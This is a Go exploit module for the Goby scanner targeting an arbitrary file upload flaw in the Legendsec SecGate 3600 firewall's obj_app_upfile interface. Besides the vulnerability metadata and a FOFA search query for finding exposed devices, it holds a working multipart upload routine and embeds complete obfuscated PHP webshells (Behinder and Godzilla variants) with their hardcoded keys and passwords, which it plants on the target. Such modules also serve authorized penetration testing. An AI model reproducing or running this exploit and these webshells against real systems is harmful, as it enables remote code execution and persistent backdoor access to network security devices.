package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Wangshen SecGate 3600 firewall obj_app_upfile file upload vulnerability",
    "Description": "<p>Wangshen SecGate 3600 firewall is a security system produced by Legendsec.</p><p>There is a file upload vulnerability in the obj_app_upfile interface of the SecGate 3600 firewall. Attackers can upload files by constructing special request packets to obtain server permissions.</p>",
    "Impact": "<p>Attackers can execute vulnerabilities in server-side code, write backdoors, gain server privileges, and control web servers.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the update in time: <a href=\"https://www.legendsec.com/newsec.php?up=2&amp;cid=108\">https://www.legendsec.com/newsec.php?up=2&amp;cid=108</a></p>",
    "Product": "legendsec-Firewall",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "网神 SecGate 3600 防火墙 obj_app_upfile 文件上传漏洞",
            "Product": "网神-防火墙",
            "Description": "<p>网神 SecGate 3600 防火墙是网神生产的一款安全系统。</p><p>网神 SecGate 3600 防火墙 obj_app_upfile 接口存在任意文件上传漏洞，攻击者通过构造特殊请求包上传任意文件，获取服务器权限。</p>",
            "Recommendation": "<p>厂商未发布漏洞修复程序，请及时关注更新：<a href=\"https://www.legendsec.com/newsec.php?up=2&amp;cid=108\">https://www.legendsec.com/newsec.php?up=2&amp;cid=108</a><br></p>",
            "Impact": "<p>攻击者可以任意在服务器端代码执行漏洞，编写后门，让服务器权限，并控制 web 服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Wangshen SecGate 3600 firewall obj_app_upfile file upload vulnerability",
            "Product": "legendsec-Firewall",
            "Description": "<p>Wangshen SecGate 3600 firewall is a security system produced by Legendsec.</p><p>There is a file upload vulnerability in the obj_app_upfile interface of the SecGate 3600 firewall. Attackers can upload files by constructing special request packets to obtain server permissions.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided,&nbsp;please pay attention to the update in time:&nbsp;<a href=\"https://www.legendsec.com/newsec.php?up=2&amp;cid=108\">https://www.legendsec.com/newsec.php?up=2&amp;cid=108</a><br></p>",
            "Impact": "<p>Attackers can execute vulnerabilities in server-side code, write backdoors, gain server privileges, and control web servers.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "title=\"网神SecGate 3600防火墙\"",
    "GobyQuery": "title=\"网神SecGate 3600防火墙\"",
    "Author": "1171373465@qq.com",
    "Homepage": "https://www.legendsec.com/",
    "DisclosureDate": "2022-04-27",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2022-58824"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.php",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo \"hello\";?>",
            "show": "attackType=custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "9.8",
    "PocId": "10497"
}`

	sendPayloadfa1eee0d := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		boundary := goutils.RandomHexString(32)
		cfg.Header.Store("Content-Type", "multipart/form-data; boundary="+boundary)
		cfg.Data = strings.ReplaceAll(`--`+boundary+`
Content-Disposition: form-data; name="upfile"; filename="`+filename+`"
Content-Type: text/plain

`+content+`
--`+boundary+`
Content-Disposition:  form-data; name="submit_post"

obj_app_upfile
--`+boundary, "\n", "\r\n")
		_, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}

		cfgCheck := httpclient.NewGetRequestConfig("/attachements/" + filename)
		cfgCheck.VerifyTls = false
		cfgCheck.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfgCheck)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(16)
			filename := goutils.RandomHexString(16) + ".php"
			rsp, err := sendPayloadfa1eee0d(u, filename, "<?php @error_reporting(0);echo \""+checkString+"\";unlink(__FILE__);?>")
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, checkString) && !strings.Contains(rsp.Utf8Html, "<?php")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16) + ".php"
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if(isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if(isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if(strpos($payload,"getBasicsInfo")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if(strpos($data,"getBasicsInfo")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}?>`
				}
			}
			rsp, err := sendPayloadfa1eee0d(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			if attackType == "custom" {
				expResult.Output += "URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			} else {
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
			}
			expResult.Output += "Webshell type: php"
			return expResult
		},
	))
}